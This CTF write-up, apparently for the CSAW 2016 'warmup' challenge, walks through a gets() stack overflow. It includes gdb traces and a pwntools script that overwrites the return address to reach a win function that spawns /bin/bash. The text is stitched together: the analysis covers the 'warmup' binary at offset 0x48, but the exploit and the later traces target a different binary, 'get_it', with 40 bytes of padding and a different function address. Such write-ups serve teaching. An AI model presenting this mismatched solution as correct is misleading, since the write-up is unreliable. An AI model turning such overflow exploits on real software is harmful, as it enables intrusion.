# Csaw 2016 Quals Warmup

This was done on `Ubuntu 20.04.4`. Let's take a look at the binary:

![intro_data](pics/intro_data.png)

So we can see that we are dealing with a 64 bit binary. When we run it, it displays an address (looks like an address from the code section of the binary, versus another section like the libc) and prompts us for input. When we look at the main function in Ghidra, we see this:

![intro_data](pics/main.png)


So we can see that the address being printed is the address of the function `easy` (which when we look at it's address in Ghidra we see it's `0x40060d`). After that we can see it calls the function `gets`, which is a bug since it doesn't limit how much data it scans in (and since `input` can only hold `64` bytes of data, after we write `64` bytes we overflow the buffer and start overwriting other things in memory). With that bug we can totally reach the return address (the address on the stack that is executed after the `ret` call to return execution back to whatever code called it). For what to call, we see that the `easy` function will print the flag for us (in order to print the flag, we will need to have a `flag.txt` file in the same directory as the executable):

![intro_data](pics/main.png)


So let's use gdb to figure out how much data we need to send before overwriting the return address, so we can land the bug. I will just set a breakpoint for after the `gets` call:

```
gef➤  disas main
Dump of assembler code for function main:
   0x000000000040061d <+0>:    push   rbp
   0x000000000040061e <+1>:    mov    rbp,rsp
   0x0000000000400621 <+4>:    add    rsp,0xffffffffffffff80
   0x0000000000400625 <+8>:    mov    edx,0xa
   0x000000000040062a <+13>:    mov    esi,0x400741
   0x000000000040062f <+18>:    mov    edi,0x1
   0x0000000000400634 <+23>:    call   0x4004c0 <write@plt>
   0x0000000000400639 <+28>:    mov    edx,0x4
   0x000000000040063e <+33>:    mov    esi,0x40074c
   0x0000000000400643 <+38>:    mov    edi,0x1
   0x0000000000400648 <+43>:    call   0x4004c0 <write@plt>
   0x000000000040064d <+48>:    lea    rax,[rbp-0x80]
   0x0000000000400651 <+52>:    mov    edx,0x40060d
   0x0000000000400656 <+57>:    mov    esi,0x400751
   0x000000000040065b <+62>:    mov    rdi,rax
   0x000000000040065e <+65>:    mov    eax,0x0
   0x0000000000400663 <+70>:    call   0x400510 <sprintf@plt>
   0x0000000000400668 <+75>:    lea    rax,[rbp-0x80]
   0x000000000040066c <+79>:    mov    edx,0x9
   0x0000000000400671 <+84>:    mov    rsi,rax
   0x0000000000400674 <+87>:    mov    edi,0x1
   0x0000000000400679 <+92>:    call   0x4004c0 <write@plt>
   0x000000000040067e <+97>:    mov    edx,0x1
   0x0000000000400683 <+102>:    mov    esi,0x400755
   0x0000000000400688 <+107>:    mov    edi,0x1
   0x000000000040068d <+112>:    call   0x4004c0 <write@plt>
   0x0000000000400692 <+117>:    lea    rax,[rbp-0x40]
   0x0000000000400696 <+121>:    mov    rdi,rax
   0x0000000000400699 <+124>:    mov    eax,0x0
   0x000000000040069e <+129>:    call   0x400500 <gets@plt>
   0x00000000004006a3 <+134>:    leave  
   0x00000000004006a4 <+135>:    ret    
End of assembler dump.
gef➤  b *main+134
Breakpoint 1 at 0x4006a3
gef➤  r
Starting program: /Hackery/pod/modules/bof_callfunction/csaw16_warmup/warmup
-Warm Up-
WOW:0x40060d
>15935728
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffde50  →  "15935728"
$rbx   : 0x0               
$rcx   : 0x00007ffff7dcfa00  →  0x00000000fbad2288
$rdx   : 0x00007ffff7dd18d0  →  0x0000000000000000
$rsp   : 0x00007fffffffde10  →  "0x40060d"
$rbp   : 0x00007fffffffde90  →  0x00000000004006b0  →  <__libc_csu_init+0> push r15
$rsi   : 0x35333935        
$rdi   : 0x00007fffffffde51  →  0x0038323735333935 ("5935728"?)
$rip   : 0x00000000004006a3  →  <main+134> leave
$r8    : 0x0000000000602269  →  0x0000000000000000
$r9    : 0x00007ffff7fda4c0  →  0x00007ffff7fda4c0  →  [loop detected]
$r10   : 0x0000000000602010  →  0x0000000000000000
$r11   : 0x246             
$r12   : 0x0000000000400520  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffdf70  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffde10│+0x0000: "0x40060d"     ← $rsp
0x00007fffffffde18│+0x0008: 0x000000000000000a
0x00007fffffffde20│+0x0010: 0x0000000000000000
0x00007fffffffde28│+0x0018: 0x0000000000000000
0x00007fffffffde30│+0x0020: 0x0000000000000000
0x00007fffffffde38│+0x0028: 0x0000000000000000
0x00007fffffffde40│+0x0030: 0x0000000000000000
0x00007fffffffde48│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400694 <main+119>       rex.RB ror BYTE PTR [r8-0x77], 0xc7
     0x400699 <main+124>       mov    eax, 0x0
     0x40069e <main+129>       call   0x400500 <gets@plt>
 →   0x4006a3 <main+134>       leave  
     0x4006a4 <main+135>       ret    
     0x4006a5                  nop    WORD PTR cs:[rax+rax*1+0x0]
     0x4006af                  nop    
     0x4006b0 <__libc_csu_init+0> push   r15
     0x4006b2 <__libc_csu_init+2> mov    r15d, edi
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "warmup", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006a3 → main()
────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x00000000004006a3 in main ()
gef➤  search-pattern 15935728
[+] Searching '15935728' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x602260 - 0x602268  →   "15935728"
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffde50 - 0x7fffffffde58  →   "15935728"
gef➤  i f
Stack level 0, frame at 0x7fffffffdea0:
 rip = 0x4006a3 in main; saved rip = 0x7ffff7a05b97
 Arglist at 0x7fffffffde90, args:
 Locals at 0x7fffffffde90, Previous frame's sp is 0x7fffffffdea0
 Saved registers:
  rbp at 0x7fffffffde90, rip at 0x7fffffffde98
```

With a bit of math, we see the offset:

![python3](pics/python3.png)

We can also see this in the stack layout in ghidra. Here we see that `input` is stored at offset `-0x48`. This is the offset from `input` to the saved stack return addrress (although I have seen this be wrong in certaint scenarios):

![stack_frame](pics/stack_frame.png)

So we can see that after `0x48` bytes of input, we start overwriting the return address. With all of this, we can write the exploit;
```
from pwn import *

target = process("./get_it")
gdb.attach(target, gdbscript = 'b *0x4005f1')

input()

payload = b""
payload += b"0"*40 # Padding to the return address
payload += p64(0x4005b6) # Address of give_shell in least endian, will be new saved return address

# Send the payload
target.sendline(payload)

# Drop to an interactive shell to use the new shell
target.interactive()
```

So one thing about this particular challenge. If you run the explouit on more modern versions of Ubuntu, it will probably crash. With pwning, we sometimes run into weird problems caused by the enviornment we run the binary on. This is one of those. Depending on the version of Ubuntu we run this on, this exploit will or will not work. I believe this is because of a stack alignment issue.

I would say the important thing is, as long as call the `give_shell` function is called, we should consider this challenge was solved. That is the actual intended solution for this challenge:

```
Breakpoint 1, 0x00000000004005f1 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007ffc1aa6c630  →  0x3030303030303030 ("00000000"?)
$rbx   : 0x00000000400600  →  <__libc_csu_init+0> push r15
$rcx   : 0x007f3c5ae85980  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x007ffc1aa6c620  →  0x007ffc1aa6c748  →  0x007ffc1aa6e413  →  "./get_it"
$rbp   : 0x007ffc1aa6c650  →  0x3030303030303030 ("00000000"?)
$rsi   : 0x00000001f316b1  →  0x3030303030303030 ("00000000"?)
$rdi   : 0x007f3c5ae877f0  →  0x0000000000000000
$rip   : 0x000000004005f1  →  <main+42> mov eax, 0x0
$r8    : 0x007ffc1aa6c630  →  0x3030303030303030 ("00000000"?)
$r9    : 0x0               
$r10   : 0xfffffffffffff364
$r11   : 0x246             
$r12   : 0x000000004004c0  →  <_start+0> xor ebp, ebp
$r13   : 0x007ffc1aa6c740  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────── stack ────
0x007ffc1aa6c620│+0x0000: 0x007ffc1aa6c748  →  0x007ffc1aa6e413  →  "./get_it"   ← $rsp
0x007ffc1aa6c628│+0x0008: 0x0000000100400600
0x007ffc1aa6c630│+0x0010: 0x3030303030303030     ← $rax, $r8
0x007ffc1aa6c638│+0x0018: 0x3030303030303030
0x007ffc1aa6c640│+0x0020: 0x3030303030303030
0x007ffc1aa6c648│+0x0028: 0x3030303030303030
0x007ffc1aa6c650│+0x0030: 0x3030303030303030     ← $rbp
0x007ffc1aa6c658│+0x0038: 0x000000004005b6  →  <give_shell+0> push rbp
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005e4 <main+29>        mov    rdi, rax
     0x4005e7 <main+32>        mov    eax, 0x0
     0x4005ec <main+37>        call   0x4004a0 <gets@plt>
●→   0x4005f1 <main+42>        mov    eax, 0x0
     0x4005f6 <main+47>        leave  
     0x4005f7 <main+48>        ret    
     0x4005f8                  nop    DWORD PTR [rax+rax*1+0x0]
     0x400600 <__libc_csu_init+0> push   r15
     0x400602 <__libc_csu_init+2> push   r14
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "get_it", stopped 0x4005f1 in main (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005f1 → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  si
0x00000000004005f6 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00000000400600  →  <__libc_csu_init+0> push r15
$rcx   : 0x007f3c5ae85980  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x007ffc1aa6c620  →  0x007ffc1aa6c748  →  0x007ffc1aa6e413  →  "./get_it"
$rbp   : 0x007ffc1aa6c650  →  0x3030303030303030 ("00000000"?)
$rsi   : 0x00000001f316b1  →  0x3030303030303030 ("00000000"?)
$rdi   : 0x007f3c5ae877f0  →  0x0000000000000000
$rip   : 0x000000004005f6  →  <main+47> leave 
$r8    : 0x007ffc1aa6c630  →  0x3030303030303030 ("00000000"?)
$r9    : 0x0               
$r10   : 0xfffffffffffff364
$r11   : 0x246             
$r12   : 0x000000004004c0  →  <_start+0> xor ebp, ebp
$r13   : 0x007ffc1aa6c740  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────── stack ────
0x007ffc1aa6c620│+0x0000: 0x007ffc1aa6c748  →  0x007ffc1aa6e413  →  "./get_it"   ← $rsp
0x007ffc1aa6c628│+0x0008: 0x0000000100400600
0x007ffc1aa6c630│+0x0010: 0x3030303030303030     ← $r8
0x007ffc1aa6c638│+0x0018: 0x3030303030303030
0x007ffc1aa6c640│+0x0020: 0x3030303030303030
0x007ffc1aa6c648│+0x0028: 0x3030303030303030
0x007ffc1aa6c650│+0x0030: 0x3030303030303030     ← $rbp
0x007ffc1aa6c658│+0x0038: 0x000000004005b6  →  <give_shell+0> push rbp
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005e7 <main+32>        mov    eax, 0x0
     0x4005ec <main+37>        call   0x4004a0 <gets@plt>
●    0x4005f1 <main+42>        mov    eax, 0x0
 →   0x4005f6 <main+47>        leave  
     0x4005f7 <main+48>        ret    
     0x4005f8                  nop    DWORD PTR [rax+rax*1+0x0]
     0x400600 <__libc_csu_init+0> push   r15
     0x400602 <__libc_csu_init+2> push   r14
     0x400604 <__libc_csu_init+4> mov    r15d, edi
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "get_it", stopped 0x4005f6 in main (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005f6 → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  si
0x00000000004005f7 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00000000400600  →  <__libc_csu_init+0> push r15
$rcx   : 0x007f3c5ae85980  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x007ffc1aa6c658  →  0x000000004005b6  →  <give_shell+0> push rbp
$rbp   : 0x3030303030303030 ("00000000"?)
$rsi   : 0x00000001f316b1  →  0x3030303030303030 ("00000000"?)
$rdi   : 0x007f3c5ae877f0  →  0x0000000000000000
$rip   : 0x000000004005f7  →  <main+48> ret 
$r8    : 0x007ffc1aa6c630  →  0x3030303030303030 ("00000000"?)
$r9    : 0x0               
$r10   : 0xfffffffffffff364
$r11   : 0x246             
$r12   : 0x000000004004c0  →  <_start+0> xor ebp, ebp
$r13   : 0x007ffc1aa6c740  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────── stack ────
0x007ffc1aa6c658│+0x0000: 0x000000004005b6  →  <give_shell+0> push rbp   ← $rsp
0x007ffc1aa6c660│+0x0008: 0x0000000200000000
0x007ffc1aa6c668│+0x0010: 0x007ffc1aa6c748  →  0x007ffc1aa6e413  →  "./get_it"
0x007ffc1aa6c670│+0x0018: 0x000000015ae817a0
0x007ffc1aa6c678│+0x0020: 0x000000004005c7  →  <main+0> push rbp
0x007ffc1aa6c680│+0x0028: 0x00000000400600  →  <__libc_csu_init+0> push r15
0x007ffc1aa6c688│+0x0030: 0xaba209cb5252b7a6
0x007ffc1aa6c690│+0x0038: 0x000000004004c0  →  <_start+0> xor ebp, ebp
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005ec <main+37>        call   0x4004a0 <gets@plt>
●    0x4005f1 <main+42>        mov    eax, 0x0
     0x4005f6 <main+47>        leave  
 →   0x4005f7 <main+48>        ret    
   ↳    0x4005b6 <give_shell+0>   push   rbp
        0x4005b7 <give_shell+1>   mov    rbp, rsp
        0x4005ba <give_shell+4>   mov    edi, 0x400684
        0x4005bf <give_shell+9>   call   0x400480 <system@plt>
        0x4005c4 <give_shell+14>  nop    
        0x4005c5 <give_shell+15>  pop    rbp
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "get_it", stopped 0x4005f7 in main (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005f7 → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  si
0x00000000004005b6 in give_shell ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00000000400600  →  <__libc_csu_init+0> push r15
$rcx   : 0x007f3c5ae85980  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x007ffc1aa6c660  →  0x0000000200000000
$rbp   : 0x3030303030303030 ("00000000"?)
$rsi   : 0x00000001f316b1  →  0x3030303030303030 ("00000000"?)
$rdi   : 0x007f3c5ae877f0  →  0x0000000000000000
$rip   : 0x000000004005b6  →  <give_shell+0> push rbp
$r8    : 0x007ffc1aa6c630  →  0x3030303030303030 ("00000000"?)
$r9    : 0x0               
$r10   : 0xfffffffffffff364
$r11   : 0x246             
$r12   : 0x000000004004c0  →  <_start+0> xor ebp, ebp
$r13   : 0x007ffc1aa6c740  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────── stack ────
0x007ffc1aa6c660│+0x0000: 0x0000000200000000     ← $rsp
0x007ffc1aa6c668│+0x0008: 0x007ffc1aa6c748  →  0x007ffc1aa6e413  →  "./get_it"
0x007ffc1aa6c670│+0x0010: 0x000000015ae817a0
0x007ffc1aa6c678│+0x0018: 0x000000004005c7  →  <main+0> push rbp
0x007ffc1aa6c680│+0x0020: 0x00000000400600  →  <__libc_csu_init+0> push r15
0x007ffc1aa6c688│+0x0028: 0xaba209cb5252b7a6
0x007ffc1aa6c690│+0x0030: 0x000000004004c0  →  <_start+0> xor ebp, ebp
0x007ffc1aa6c698│+0x0038: 0x007ffc1aa6c740  →  0x0000000000000001
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005ae <frame_dummy+30> call   rax
     0x4005b0 <frame_dummy+32> pop    rbp
     0x4005b1 <frame_dummy+33> jmp    0x400530 <register_tm_clones>
 →   0x4005b6 <give_shell+0>   push   rbp
     0x4005b7 <give_shell+1>   mov    rbp, rsp
     0x4005ba <give_shell+4>   mov    edi, 0x400684
     0x4005bf <give_shell+9>   call   0x400480 <system@plt>
     0x4005c4 <give_shell+14>  nop    
     0x4005c5 <give_shell+15>  pop    rbp
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "get_it", stopped 0x4005b6 in give_shell (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005b6 → give_shell()
────────────────────────────────────────────────────────────────────────────────
gef➤  si
0x00000000004005b7 in give_shell ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00000000400600  →  <__libc_csu_init+0> push r15
$rcx   : 0x007f3c5ae85980  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x007ffc1aa6c658  →  "00000000"
$rbp   : 0x3030303030303030 ("00000000"?)
$rsi   : 0x00000001f316b1  →  0x3030303030303030 ("00000000"?)
$rdi   : 0x007f3c5ae877f0  →  0x0000000000000000
$rip   : 0x000000004005b7  →  <give_shell+1> mov rbp, rsp
$r8    : 0x007ffc1aa6c630  →  "000000000000000000000000000000000000000000000000"
$r9    : 0x0               
$r10   : 0xfffffffffffff364
$r11   : 0x246             
$r12   : 0x000000004004c0  →  <_start+0> xor ebp, ebp
$r13   : 0x007ffc1aa6c740  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────── stack ────
0x007ffc1aa6c658│+0x0000: "00000000"     ← $rsp
0x007ffc1aa6c660│+0x0008: 0x0000000200000000
0x007ffc1aa6c668│+0x0010: 0x007ffc1aa6c748  →  0x007ffc1aa6e413  →  "./get_it"
0x007ffc1aa6c670│+0x0018: 0x000000015ae817a0
0x007ffc1aa6c678│+0x0020: 0x000000004005c7  →  <main+0> push rbp
0x007ffc1aa6c680│+0x0028: 0x00000000400600  →  <__libc_csu_init+0> push r15
0x007ffc1aa6c688│+0x0030: 0xaba209cb5252b7a6
0x007ffc1aa6c690│+0x0038: 0x000000004004c0  →  <_start+0> xor ebp, ebp
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005b0 <frame_dummy+32> pop    rbp
     0x4005b1 <frame_dummy+33> jmp    0x400530 <register_tm_clones>
     0x4005b6 <give_shell+0>   push   rbp
 →   0x4005b7 <give_shell+1>   mov    rbp, rsp
     0x4005ba <give_shell+4>   mov    edi, 0x400684
     0x4005bf <give_shell+9>   call   0x400480 <system@plt>
     0x4005c4 <give_shell+14>  nop    
     0x4005c5 <give_shell+15>  pop    rbp
     0x4005c6 <give_shell+16>  ret    
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "get_it", stopped 0x4005b7 in give_shell (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005b7 → give_shell()
────────────────────────────────────────────────────────────────────────────────
gef➤  si
0x00000000004005ba in give_shell ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00000000400600  →  <__libc_csu_init+0> push r15
$rcx   : 0x007f3c5ae85980  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x007ffc1aa6c658  →  "00000000"
$rbp   : 0x007ffc1aa6c658  →  "00000000"
$rsi   : 0x00000001f316b1  →  0x3030303030303030 ("00000000"?)
$rdi   : 0x007f3c5ae877f0  →  0x0000000000000000
$rip   : 0x000000004005ba  →  <give_shell+4> mov edi, 0x400684
$r8    : 0x007ffc1aa6c630  →  "000000000000000000000000000000000000000000000000"
$r9    : 0x0               
$r10   : 0xfffffffffffff364
$r11   : 0x246             
$r12   : 0x000000004004c0  →  <_start+0> xor ebp, ebp
$r13   : 0x007ffc1aa6c740  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────── stack ────
0x007ffc1aa6c658│+0x0000: "00000000"     ← $rsp, $rbp
0x007ffc1aa6c660│+0x0008: 0x0000000200000000
0x007ffc1aa6c668│+0x0010: 0x007ffc1aa6c748  →  0x007ffc1aa6e413  →  "./get_it"
0x007ffc1aa6c670│+0x0018: 0x000000015ae817a0
0x007ffc1aa6c678│+0x0020: 0x000000004005c7  →  <main+0> push rbp
0x007ffc1aa6c680│+0x0028: 0x00000000400600  →  <__libc_csu_init+0> push r15
0x007ffc1aa6c688│+0x0030: 0xaba209cb5252b7a6
0x007ffc1aa6c690│+0x0038: 0x000000004004c0  →  <_start+0> xor ebp, ebp
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005b1 <frame_dummy+33> jmp    0x400530 <register_tm_clones>
     0x4005b6 <give_shell+0>   push   rbp
     0x4005b7 <give_shell+1>   mov    rbp, rsp
 →   0x4005ba <give_shell+4>   mov    edi, 0x400684
     0x4005bf <give_shell+9>   call   0x400480 <system@plt>
     0x4005c4 <give_shell+14>  nop    
     0x4005c5 <give_shell+15>  pop    rbp
     0x4005c6 <give_shell+16>  ret    
     0x4005c7 <main+0>         push   rbp
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "get_it", stopped 0x4005ba in give_shell (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005ba → give_shell()
────────────────────────────────────────────────────────────────────────────────
gef➤  si
0x00000000004005bf in give_shell ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00000000400600  →  <__libc_csu_init+0> push r15
$rcx   : 0x007f3c5ae85980  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x007ffc1aa6c658  →  "00000000"
$rbp   : 0x007ffc1aa6c658  →  "00000000"
$rsi   : 0x00000001f316b1  →  0x3030303030303030 ("00000000"?)
$rdi   : 0x00000000400684  →  "/bin/bash"
$rip   : 0x000000004005bf  →  <give_shell+9> call 0x400480 <system@plt>
$r8    : 0x007ffc1aa6c630  →  "000000000000000000000000000000000000000000000000"
$r9    : 0x0               
$r10   : 0xfffffffffffff364
$r11   : 0x246             
$r12   : 0x000000004004c0  →  <_start+0> xor ebp, ebp
$r13   : 0x007ffc1aa6c740  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────── stack ────
0x007ffc1aa6c658│+0x0000: "00000000"     ← $rsp, $rbp
0x007ffc1aa6c660│+0x0008: 0x0000000200000000
0x007ffc1aa6c668│+0x0010: 0x007ffc1aa6c748  →  0x007ffc1aa6e413  →  "./get_it"
0x007ffc1aa6c670│+0x0018: 0x000000015ae817a0
0x007ffc1aa6c678│+0x0020: 0x000000004005c7  →  <main+0> push rbp
0x007ffc1aa6c680│+0x0028: 0x00000000400600  →  <__libc_csu_init+0> push r15
0x007ffc1aa6c688│+0x0030: 0xaba209cb5252b7a6
0x007ffc1aa6c690│+0x0038: 0x000000004004c0  →  <_start+0> xor ebp, ebp
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005b6 <give_shell+0>   push   rbp
     0x4005b7 <give_shell+1>   mov    rbp, rsp
     0x4005ba <give_shell+4>   mov    edi, 0x400684
 →   0x4005bf <give_shell+9>   call   0x400480 <system@plt>
   ↳    0x400480 <system@plt+0>   jmp    QWORD PTR [rip+0x200b9a]        # 0x601020 <system@got.plt>
        0x400486 <system@plt+6>   push   0x1
        0x40048b <system@plt+11>  jmp    0x400460
        0x400490 <__libc_start_main@plt+0> jmp    QWORD PTR [rip+0x200b92]        # 0x601028 <__libc_start_main@got.plt>
        0x400496 <__libc_start_main@plt+6> push   0x2
        0x40049b <__libc_start_main@plt+11> jmp    0x400460
─────────────────────────────────────────────────────── arguments (guessed) ────
system@plt (
   $rdi = 0x00000000400684 → "/bin/bash"
)
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "get_it", stopped 0x4005bf in give_shell (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005bf → give_shell()
────────────────────────────────────────────────────────────────────────────────
gef➤  
```

So there in gdb, we see that `give_shell` was called, which called `system` with `"/bin/bash"`, which was the intended solution.
